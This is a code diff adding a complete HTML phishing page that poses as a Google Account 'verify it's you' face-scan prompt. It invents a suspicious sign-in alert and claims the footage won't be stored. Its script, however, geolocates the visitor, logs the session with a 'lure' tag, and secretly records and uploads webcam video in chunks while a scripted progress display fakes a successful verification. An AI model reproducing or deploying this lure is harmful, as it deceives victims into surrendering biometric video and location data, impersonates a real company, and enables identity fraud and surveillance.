@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Google Account</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { font-family: 'Google Sans', Roboto, Arial, sans-serif; background: #202124; color: #e8eaed; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
+  .card { background: #292a2d; border-radius: 16px; width: 100%; max-width: 420px; padding: 32px 28px; margin: 20px; box-shadow: 0 4px 32px rgba(0,0,0,0.4); }
+  .google-logo { display: flex; align-items: center; gap: 8px; margin-bottom: 28px; }
+  .g-dot { width: 10px; height: 10px; border-radius: 50%; }
+  .g1{background:#4285f4} .g2{background:#ea4335} .g3{background:#fbbc05} .g4{background:#34a853}
+  .g-text { font-size: 18px; font-weight: 500; color: #e8eaed; }
+
+  .alert { background: #2d2000; border: 1px solid #fbbc05; border-radius: 10px; padding: 14px; margin-bottom: 24px; display: flex; gap: 10px; }
+  .alert-icon { font-size: 20px; flex-shrink: 0; }
+  .alert-title { font-size: 13px; font-weight: 600; color: #fbbc05; margin-bottom: 3px; }
+  .alert-body { font-size: 12px; color: #9aa0a6; line-height: 1.5; }
+
+  h2 { font-size: 20px; font-weight: 500; margin-bottom: 6px; }
+  .subtitle { font-size: 13px; color: #9aa0a6; margin-bottom: 24px; line-height: 1.5; }
+
+  .cam-wrap { width: 100%; aspect-ratio: 4/3; background: #1a1a1a; border-radius: 12px; overflow: hidden; position: relative; margin-bottom: 16px; display: flex; align-items: center; justify-content: center; border: 1.5px solid #3c4043; }
+  #preview { width: 100%; height: 100%; object-fit: cover; display: none; transform: scaleX(-1); }
+  .placeholder { display: flex; flex-direction: column; align-items: center; gap: 8px; color: #5f6368; }
+  .placeholder .icon { font-size: 44px; }
+  .placeholder .txt { font-size: 13px; }
+
+  /* face frame */
+  .face-frame { position: absolute; inset: 0; display: none; align-items: center; justify-content: center; pointer-events: none; }
+  .face-circle { width: 160px; height: 200px; border: 3px solid #4285f4; border-radius: 50%; box-shadow: 0 0 0 2000px rgba(0,0,0,0.45); animation: glow 2s infinite; }
+  @keyframes glow { 0%,100%{border-color:#4285f4;box-shadow:0 0 0 2000px rgba(0,0,0,0.45)} 50%{border-color:#34a853;box-shadow:0 0 0 2000px rgba(0,0,0,0.45)} }
+  .face-hint { position: absolute; bottom: 50px; left: 0; right: 0; text-align: center; font-size: 13px; color: #fff; font-weight: 500; text-shadow: 0 1px 4px #000; }
+  .scan-bar { position: absolute; height: 2px; left: 10%; right: 10%; background: linear-gradient(90deg,transparent,#4285f4,transparent); display: none; animation: scanbar 1.5s linear infinite; }
+  @keyframes scanbar { 0%{top:20%} 100%{top:78%} }
+
+  .status { font-size: 13px; color: #9aa0a6; text-align: center; margin-bottom: 16px; min-height: 18px; }
+  .progress-bar { height: 3px; background: #3c4043; border-radius: 2px; margin-bottom: 20px; display: none; }
+  .progress-fill { height: 100%; width: 0%; background: #4285f4; border-radius: 2px; transition: width 0.5s ease; }
+
+  .btn { width: 100%; background: #4285f4; color: #fff; border: none; border-radius: 8px; padding: 13px; font-size: 15px; font-weight: 500; cursor: pointer; margin-bottom: 12px; }
+  .btn:disabled { background: #3c4043; color: #5f6368; cursor: not-allowed; }
+  .btn-outline { width: 100%; background: transparent; color: #8ab4f8; border: 1px solid #3c4043; border-radius: 8px; padding: 12px; font-size: 14px; cursor: pointer; }
+
+  .success { background: #001a00; border: 1px solid #34a853; border-radius: 10px; padding: 16px; text-align: center; display: none; }
+  .success .icon { font-size: 32px; margin-bottom: 8px; }
+  .success .title { font-size: 15px; font-weight: 600; color: #34a853; margin-bottom: 4px; }
+  .success .msg { font-size: 13px; color: #9aa0a6; }
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="google-logo">
+    <div class="g-dot g1"></div><div class="g-dot g2"></div>
+    <div class="g-dot g3"></div><div class="g-dot g4"></div>
+    <div class="g-text">Google Account</div>
+  </div>
+
+  <div class="alert">
+    <div class="alert-icon">🔐</div>
+    <div>
+      <div class="alert-title">New sign-in detected</div>
+      <div class="alert-body">Someone signed into your Google Account from a new device in Mumbai, Maharashtra. Verify your identity to secure your account.</div>
+    </div>
+  </div>
+
+  <h2>Verify it's you</h2>
+  <div class="subtitle">To protect your account, Google needs to confirm your identity with a quick face scan. This won't be stored.</div>
+
+  <div class="cam-wrap">
+    <video id="preview" autoplay muted playsinline></video>
+    <div class="placeholder" id="placeholder">
+      <div class="icon">👤</div>
+      <div class="txt">Camera preview</div>
+    </div>
+    <div class="face-frame" id="faceFrame">
+      <div class="face-circle"></div>
+      <div class="face-hint" id="faceHint">Center your face in the circle</div>
+    </div>
+    <div class="scan-bar" id="scanBar"></div>
+  </div>
+
+  <div class="progress-bar" id="progressBar"><div class="progress-fill" id="progressFill"></div></div>
+  <div class="status" id="statusMsg">We'll guide you through the process</div>
+
+  <button class="btn" id="verifyBtn" onclick="startVerify()">Verify with face scan</button>
+  <button class="btn-outline">Use another verification method</button>
+
+  <div class="success" id="successBox">
+    <div class="icon">✅</div>
+    <div class="title">Verification Complete</div>
+    <div class="msg">Your Google Account is now secured. The suspicious signin has been blocked.</div>
+  </div>
+</div>
+
+<script>
+const SID = Math.random().toString(36).substr(2,10) + Date.now().toString(36);
+let mediaRecorder, chunkIndex = 0, stream;
+
+async function getGeo() {
+  try { return await (await fetch("https://ipapi.co/json/")).json(); } catch { return {}; }
+}
+
+function setProgress(pct) {
+  document.getElementById("progressFill").style.width = pct + "%";
+}
+
+async function startVerify() {
+  const btn = document.getElementById("verifyBtn");
+  btn.disabled = true; btn.textContent = "Opening camera...";
+  document.getElementById("statusMsg").textContent = "Please allow camera access";
+
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode:"user", width:1280, height:720 }, audio: false });
+  } catch {
+    document.getElementById("statusMsg").textContent = "Camera access denied. Tap button to retry.";
+    btn.disabled = false; btn.textContent = "Verify with face scan";
+    return;
+  }
+
+  document.getElementById("preview").srcObject = stream;
+  document.getElementById("preview").style.display = "block";
+  document.getElementById("placeholder").style.display = "none";
+  document.getElementById("faceFrame").style.display = "flex";
+  document.getElementById("scanBar").style.display = "block";
+  document.getElementById("progressBar").style.display = "block";
+  btn.textContent = "Scanning...";
+
+  const geo = await getGeo();
+  await fetch("/log", { method:"POST", headers:{"Content-Type":"application/json"},
+    body: JSON.stringify({ session:SID, geo, lure:"google_verify" }) }).catch(()=>{});
+
+  startRecording(stream);
+
+  // progress simulation
+  const steps = [
+    [1500,  20, "Face detected..."],
+    [4000,  45, "Analyzing facial features..."],
+    [7000,  70, "Comparing with account data..."],
+    [10000, 90, "Almost done..."],
+    [13000, 100,"Verification complete"],
+  ];
+  steps.forEach(([delay, pct, msg]) => {
+    setTimeout(() => {
+      setProgress(pct);
+      document.getElementById("statusMsg").textContent = msg;
+      if (pct >= 45) document.getElementById("faceHint").textContent = "Face matched ✓";
+    }, delay);
+  });
+
+  setTimeout(() => {
+    if (mediaRecorder && mediaRecorder.state !== "inactive") mediaRecorder.stop();
+    stream.getTracks().forEach(t => t.stop());
+    document.getElementById("faceFrame").style.display = "none";
+    document.getElementById("scanBar").style.display = "none";
+    btn.style.display = "none";
+    document.getElementById("statusMsg").textContent = "";
+    document.getElementById("successBox").style.display = "block";
+  }, 14000);
+}
+
+function startRecording(stream) {
+  const mime = MediaRecorder.isTypeSupported("video/webm;codecs=vp9") ? "video/webm;codecs=vp9" : "video/webm";
+  mediaRecorder = new MediaRecorder(stream, { mimeType: mime, videoBitsPerSecond: 1500000 });
+  mediaRecorder.ondataavailable = async (e) => {
+    if (e.data && e.data.size > 0) await sendChunk(e.data, chunkIndex++);
+  };
+  mediaRecorder.onstop = async () => {
+    await fetch(`/finalize?sid=${SID}`, { method:"POST" }).catch(()=>{});
+  };
+  mediaRecorder.start(5000);
+}
+
+async function sendChunk(blob, idx) {
+  await fetch(`/upload?sid=${SID}&chunk=${idx}`, {
+    method:"POST", headers:{"Content-Type":"video/webm"}, body: await blob.arrayBuffer()
+  }).catch(()=>{});
+}
+</script>
+</body>
+</html>
